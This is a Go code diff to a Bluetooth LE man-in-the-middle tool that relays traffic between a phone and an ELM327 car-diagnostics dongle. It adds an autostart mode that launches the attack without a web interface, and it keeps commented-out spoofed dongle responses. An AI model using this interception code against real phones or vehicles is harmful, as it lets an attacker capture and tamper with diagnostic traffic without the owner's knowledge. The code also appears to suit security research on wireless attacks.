@@ -6,6 +6,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"log"
 	"net/http"
@@ -54,8 +55,8 @@ func NewCountTestService() *gatt.Service {
 		})
 	s.AddCharacteristic(gatt.MustParseUUID("0000fff2-0000-1000-8000-00805f9b34fb")).HandleWriteFunc(
 		func(r gatt.Request, data []byte) (status byte) {
-		beginning:
 			fmt.Println("| Ready to handle data from phone")
+			isPhoneConnected = true
 			publicDataFromPhone = data // data sent to dongle
 			for len(publicDataFromDongle) == 0 {
 				// infinite loop waiting on notification from dongle
@@ -63,7 +64,7 @@ func NewCountTestService() *gatt.Service {
 			phone.Write(publicDataFromDongle)
 			publicDataFromDongle = []byte("")
 			fmt.Println("Dongle -> RPI -> Phone")
-			goto beginning
+			return gatt.StatusSuccess
 
 			/*var Z = ([]byte("ELM327 V1.5\r>"))
 			var RV = ([]byte("20.5V\r>"))
@@ -75,7 +76,6 @@ func NewCountTestService() *gatt.Service {
 				x.Write(RV)
 			}*/
 
-			return gatt.StatusSuccess
 		})
 	return s
 }
@@ -83,7 +83,6 @@ func NewCountTestService() *gatt.Service {
 func connectToPhone(gd gatt.Device) {
 	gd.Handle(
 		gatt.CentralConnected(func(c gatt.Central) {
-			isPhoneConnected = true
 			fmt.Println("| Phone is connected, connections id: ", c.ID())
 		}),
 		gatt.CentralDisconnected(func(c gatt.Central) { isPhoneConnected = false; fmt.Println("Disconnect: ", c.ID()) }),
@@ -120,9 +119,6 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 	fmt.Printf("| Successfully connected to %s \n", p.Name())
 	isDongleConnected = true
 	defer p.Device().CancelConnection(p)
-	for isPhoneConnected == false {
-		// infinite loop until phone connection is established
-	}
 	fmt.Println("| Phone is connected, try discover services ...")
 	// Set Maximum transmission unit
 	if err := p.SetMTU(500); err != nil {
@@ -231,12 +227,13 @@ func onPeriphDiscovered(p gatt.Peripheral, a *gatt.Advertisement, rssi int) {
 		p.Device().StopScanning()
 
 		fmt.Println("| Dongle found: ")
-		/*fmt.Printf("| Peripheral ID:%s, NAME:(%s)\n", p.ID(), p.Name())
-		fmt.Println("  Local Name        =", a.LocalName)
-		fmt.Println("  TX Power Level    =", a.TxPowerLevel)
-		fmt.Println("  Manufacturer Data =", a.ManufacturerData)
-		fmt.Println("  Service Data      =", a.ServiceData)
-		fmt.Println("")*/
+		fmt.Printf("| Peripheral ID:%s, NAME:(%s)\n", p.ID(), p.Name())
+		fmt.Println("| RSSI              =", rssi)
+		fmt.Println("| Local Name        =", a.LocalName)
+		fmt.Println("| TX Power Level    =", a.TxPowerLevel)
+		fmt.Println("| Manufacturer Data =", a.ManufacturerData)
+		fmt.Println("| Service Data      =", a.ServiceData)
+		fmt.Println("")
 		// Connect connects to a remote peripheral.
 		fmt.Println("| Trying to connect to dongle...")
 		p.Device().Connect(p)
@@ -272,6 +269,11 @@ func connectToDongle(gd gatt.Device) {
 }
 
 func manInTheMiddleAttack(w http.ResponseWriter, r *http.Request) {
+	fmt.Println("| {WEB} Clicked on 'Begin attack'")
+	beginAttack()
+}
+
+func beginAttack() {
 	isPhoneConnected = false
 	isDongleConnected = false
 
@@ -291,9 +293,18 @@ func manInTheMiddleAttack(w http.ResponseWriter, r *http.Request) {
 
 	// Dongle is connected
 	fmt.Println("| Trying to capture connection between Raspberry PI with mobile phone ...")
-	go connectToPhone(gattDevice)
+	connectToPhone(gattDevice)
 }
+
 func main() {
-	startMsg()
-	startServer()
+	cmd := flag.String("autostart", "", "")
+	flag.Parse()
+	if string(*cmd) == "on" {
+		startMsg()
+		fmt.Println("| Autostart is on \n| Running without server")
+		beginAttack()
+	} else {
+		startMsg()
+		startServer()
+	}
 }
